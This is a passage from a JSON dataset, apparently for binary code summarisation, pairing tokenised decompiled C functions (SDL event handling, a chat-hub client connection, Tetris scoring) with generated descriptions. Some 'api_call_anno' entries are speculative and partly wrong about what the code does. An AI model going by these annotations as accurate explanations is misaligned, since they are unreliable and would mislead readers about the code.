            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The given code is a C function that loads shapes from a file and performs various operations on the loaded data."
    },
    {
        "id": 234,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "SDL",
            "events",
            "and",
            "returns",
            "specific",
            "values",
            "based",
            "on",
            "the",
            "event",
            "type",
            "and",
            "mouse",
            "position",
            "for",
            "a",
            "game",
            "loop",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v0",
            ";",
            "__int64",
            "v1",
            ";",
            "_DWORD",
            "*",
            "v2",
            ";",
            "int",
            "result",
            ";",
            "int",
            "v4",
            ";",
            "char",
            "v5",
            "[",
            "248",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v0",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "v5",
            ";",
            "if",
            "(",
            "_asan_option_detect_stack_use_after_return",
            ")",
            "{",
            "v1",
            "=",
            "__asan_stack_malloc_2",
            "(",
            "224L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v1",
            ")",
            "v0",
            "=",
            "v1",
            ";",
            "}",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1102416563L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "8",
            ")",
            "=",
            "\"3 32 4 7 mouse_x 96 4 7 mouse_y 160 56 5 event \"",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "16",
            ")",
            "=",
            "EventReader",
            ";",
            "v2",
            "=",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            ";",
            "v2",
            "[",
            "536862720",
            "]",
            "=",
            "-",
            "235802127",
            ";",
            "v2",
            "[",
            "536862721",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v2",
            "[",
            "536862722",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v2",
            "[",
            "536862723",
            "]",
            "=",
            "-",
            "218959356",
            ";",
            "v2",
            "[",
            "536862724",
            "]",
            "=",
            "-",
            "218959118",
            ";",
            "v2",
            "[",
            "536862726",
            "]",
            "=",
            "-",
            "234881024",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "SDL_PollEvent",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "160",
            ")",
            "=",
            "=",
            "256",
            ")",
            "{",
            "result",
            "=",
            "4",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "SDL_GetMouseState",
            "(",
            "v0",
            "+",
            "32",
            ",",
            "v0",
            "+",
            "96",
            ")",
            ")",
            "goto",
            "LABEL_18",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            "<",
            "=",
            "649",
            "|",
            "|",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "32",
            ")",
            ">",
            "950",
            ")",
            "goto",
            "LABEL_18",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            ">",
            "299",
            "&",
            "&",
            "*",
            "(",
            "int",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "96",
            ")",
            "<",
            "=",
            "470",
            ")",
            "{",
            "result",
            "=",
            "14",
            ";",
            "}",
            "else",
            "{",
            "LABEL_18",
            ":",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "v4",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "160",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "768",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ";",
            "switch",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ")",
            "{",
            "case",
            "4",
            ":",
            "case",
            "0x50",
            ":",
            "result",
            "=",
            "2",
            ";",
            "break",
            ";",
            "case",
            "7",
            ":",
            "case",
            "0x4F",
            ":",
            "result",
            "=",
            "3",
            ";",
            "break",
            ";",
            "case",
            "0x13",
            ":",
            "result",
            "=",
            "12",
            ";",
            "break",
            ";",
            "case",
            "0x16",
            ":",
            "case",
            "0x51",
            ":",
            "result",
            "=",
            "1",
            ";",
            "break",
            ";",
            "case",
            "0x1A",
            ":",
            "case",
            "0x52",
            ":",
            "result",
            "=",
            "0",
            ";",
            "break",
            ";",
            "case",
            "0x2C",
            ":",
            "result",
            "=",
            "10",
            ";",
            "break",
            ";",
            "default",
            ":",
            "goto",
            "LABEL_41",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "v4",
            "=",
            "=",
            "769",
            ")",
            "{",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "<",
            "=",
            "3",
            ")",
            "__asan_report_load4",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ";",
            "switch",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "v0",
            "+",
            "176",
            ")",
            ")",
            "{",
            "case",
            "4",
            ":",
            "case",
            "0x50",
            ":",
            "result",
            "=",
            "7",
            ";",
            "break",
            ";",
            "case",
            "7",
            ":",
            "case",
            "0x4F",
            ":",
            "result",
            "=",
            "8",
            ";",
            "break",
            ";",
            "case",
            "0x13",
            ":",
            "result",
            "=",
            "13",
            ";",
            "break",
            ";",
            "case",
            "0x16",
            ":",
            "case",
            "0x51",
            ":",
            "result",
            "=",
            "6",
            ";",
            "break",
            ";",
            "case",
            "0x1A",
            ":",
            "case",
            "0x52",
            ":",
            "result",
            "=",
            "5",
            ";",
            "break",
            ";",
            "case",
            "0x2C",
            ":",
            "result",
            "=",
            "11",
            ";",
            "break",
            ";",
            "default",
            ":",
            "goto",
            "LABEL_41",
            ";",
            "}",
            "}",
            "else",
            "{",
            "LABEL_41",
            ":",
            "result",
            "=",
            "9",
            ";",
            "}",
            "}",
            "}",
            "if",
            "(",
            "v5",
            "=",
            "=",
            "(",
            "char",
            "*",
            ")",
            "v0",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "0",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v0",
            "=",
            "1172321806L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8008",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8010",
            ")",
            "=",
            "0xF5F5F5F5F5F5F5F5L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "v0",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8018",
            ")",
            "=",
            "-",
            "168430091",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"stack\" function likely implements a stack data structure, possibly for managing various aspects of execution environments, runtime stacks, or binary search trees, using linked list structures for storing data elements and facilitating operations like push and pop.",
            "The function `malloc` appears to be a memory allocation function used in C programming, typically for dynamically allocating memory for variables or data structures, as shown in the provided code snippets where it is defined to allocate memory using `GlobalAlloc` and in another snippet where it is overridden to allocate memory for a custom data structure."
        ],
        "longer_label": "The provided code appears to be a function `EventReader` implementing an event handling mechanism, possibly for SDL (Simple DirectMedia Layer) events, with memory allocation potentially for a stack data structure, and it processes different types of events returning integer codes corresponding to specific actions."
    },
    {
        "id": 235,
        "docstring_tokens": [
            "The",
            "code",
            "connects",
            "a",
            "client",
            "to",
            "a",
            "server",
            ",",
            "sends",
            "and",
            "receives",
            "specific",
            "messages",
            ",",
            "retrieves",
            "a",
            "list",
            "of",
            "nicknames",
            ",",
            "and",
            "sends",
            "client",
            "information",
            "before",
            "confirming",
            "the",
            "connection",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "client_connect",
            "(",
            "int",
            "*",
            "a1",
            ")",
            "{",
            "puts",
            "(",
            "\"Connecting...\"",
            ")",
            ";",
            "client_recv",
            "(",
            "a1",
            ",",
            "0x2000000000L",
            "L",
            ")",
            ";",
            "client_send",
            "(",
            "a1",
            ",",
            "\"$ValidateNick svefn|\"",
            ")",
            ";",
            "client_recv",
            "(",
            "a1",
            ",",
            "0x4000000L",
            "L",
            ")",
            ";",
            "client_send",
            "(",
            "a1",
            ",",
            "\"$Version 1.0091|\"",
            ")",
            ";",
            "client_send",
            "(",
            "a1",
            ",",
            "\"$GetNickList|\"",
            ")",
            ";",
            "client_send",
            "(",
            "a1",
            ",",
            "aMyinfoAllSvefn",
            ")",
            ";",
            "client_recv",
            "(",
            "a1",
            ",",
            "3221225472L",
            "L",
            ")",
            ";",
            "puts",
            "(",
            "\"Connected...\"",
            ")",
            ";",
            "return",
            "client_recv",
            "(",
            "a1",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `client` function appears to be part of a larger system, possibly a distributed system, with functions for data retrieval, networking, and possibly IR communication, designed to interact with a server, stabilize connections, and handle joining and notifying nodes within a network."
        ],
        "longer_label": "The code defines a function `client_connect` which establishes a connection, exchanges messages with a server using `client_send` and `client_recv` functions, and returns a value upon completion, likely part of a larger system for networking and data retrieval in a distributed environment."
    },
    {
        "id": 236,
        "docstring_tokens": [
            "The",
            "code",
            "updates",
            "the",
            "game",
            "score",
            "based",
            "on",
            "the",
            "number",
            "of",
            "lines",
            "cleared",
            ",",
            "increases",
            "the",
            "level",
            "if",
            "the",
            "score",
            "surpasses",
            "a",
            "certain",
            "threshold",
            ",",
            "copies",
            "the",
            "next",
            "shape",
            "to",
            "the",
            "current",
            "shape",
            ",",
            "randomly",
            "selects",
            "a",
            "shape",
            "from",
            "the",
            "list",
            "of",
            "shapes",
            ",",
            "and",
            "sets",
            "the",
            "initial",
            "position",
            "of",
            "the",
            "shape",
            "on",
            "the",
            "game",
            "board",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ",",
            "cell_0",
            "(",
            "*",
            "s",
            ")",
            "[",
            "4",
            "]",
            "[",
            "4",
            "]",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "signed",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "score",
            ";",
            "int",
            "level",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "v9",
            ";",
            "signed",
            "int",
            "v10",
            ";",
            "int",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "signed",
            "int",
            "v14",
            ";",
            "int",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "int",
            "v17",
            ";",
            "int",
            "v18",
            ";",
            "int",
            "v19",
            ";",
            "int",
            "v20",
            ";",
            "int",
            "v21",
            ";",
            "int",
            "v22",
            ";",
            "bool",
            "v23",
            ";",
            "int",
            "v24",
            ";",
            "int",
            "ms",
            ";",
            "unsigned",
            "int",
            "ls",
            ";",
            "unsigned",
            "int",
            "Ticks",
            ";",
            "unsigned",
            "int",
            "v28",
            ";",
            "cell_0",
            "(",
            "*",
            "v29",
            ")",
            "[",
            "]",
            ";",
            "int",
            "v30",
            ";",
            "int",
            "m",
            ";",
            "int",
            "v32",
            ";",
            "int",
            "v33",
            ";",
            "int",
            "l",
            ";",
            "int",
            "lines",
            ";",
            "append",
            "(",
            "g",
            ")",
            ";",
            "l",
            "=",
            "check",
            "(",
            "g",
            ")",
            ";",
            "lines",
            "=",
            "0",
            ";",
            "while",
            "(",
            "l",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "emptyLine",
            "(",
            "l",
            ",",
            "g",
            ")",
            ";",
            "l",
            "=",
            "check",
            "(",
            "g",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "1",
            ",",
            "lines",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235C80",
            ",",
            "lines",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "+",
            "+",
            "lines",
            ";",
            "}",
            "if",
            "(",
            "lines",
            "=",
            "=",
            "2",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235440",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "score",
            "=",
            "g",
            "-",
            ">",
            "score",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x64u",
            ",",
            "2u",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235D80",
            ",",
            "2L",
            "L",
            ",",
            "100L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2354A0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "level",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "v8",
            "=",
            "200",
            "*",
            "level",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "level",
            ",",
            "0xC8u",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235DC0",
            ",",
            "200L",
            "L",
            ",",
            "level",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "v8",
            ",",
            "score",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235E00",
            ",",
            "score",
            ",",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235500",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "score",
            "=",
            "v8",
            "+",
            "score",
            ";",
            "}",
            "else",
            "if",
            "(",
            "lines",
            ">",
            "2",
            ")",
            "{",
            "if",
            "(",
            "lines",
            "=",
            "=",
            "3",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235560",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "v9",
            "=",
            "g",
            "-",
            ">",
            "score",
            ";",
            "v10",
            "=",
            "300",
            "*",
            "lines",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x12Cu",
            ",",
            "lines",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235E40",
            ",",
            "lines",
            ",",
            "300L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2355C0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "v11",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "v12",
            "=",
            "v11",
            "*",
            "v10",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "v11",
            ",",
            "v10",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235E80",
            ",",
            "v10",
            ",",
            "v11",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "v12",
            ",",
            "v9",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235EC0",
            ",",
            "v9",
            ",",
            "v12",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235620",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "score",
            "=",
            "v12",
            "+",
            "v9",
            ";",
            "}",
            "else",
            "if",
            "(",
            "lines",
            "=",
            "=",
            "4",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235680",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "28",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "score",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "score",
            ")",
            ";",
            "}",
            "v13",
            "=",
            "g",
            "-",
            ">",
            "score",
            ";",
            "v14",
            "=",
            "1200",
            "*",
            "lines",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "0x4B0u",
            ",",
            "lines",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235F00",
            ",",
            "lines",
            ",",
            "1200L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_2356E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "32",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "level",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "level",
            ")",
            ";",
            "}",
            "v15",
            "=",
            "g",
            "-",
            ">",
            "level",
            ";",
            "v16",
            "=",
            "v15",
            "*",
            "v14",
            ";",
            "if",
            "(",
            "!",
            "is_mul_ok",
            "(",
            "v15",
            ",",
            "v14",
            ")",
            ")",
            "__ubsan_handle_mul_overflow",
            "(",
            "&",
            "off_235F40",
            ",",
            "v14",
            ",",
            "v15",
            ")",
            ";",
            "if",
            "(",
            "__OFADD__",
            "(",
            "v16",
            ",",
            "v13",
            ")",
            ")",
            "__ubsan_handle_add_overflow",
            "(",
            "&",
            "off_235F80",
            ",",
            "v13",
            ",",
            "v16",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_235740",
            ",",
            "g",
            ")",
            ";",
            "g",
            "-",
            ">",
            "score",
            "=",
            "v16",
            "+",
            "v13",
            ";",
            "}",
            "}",
            "else",
            "if",
            "(",
            "lines",
            "=",
            "=",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
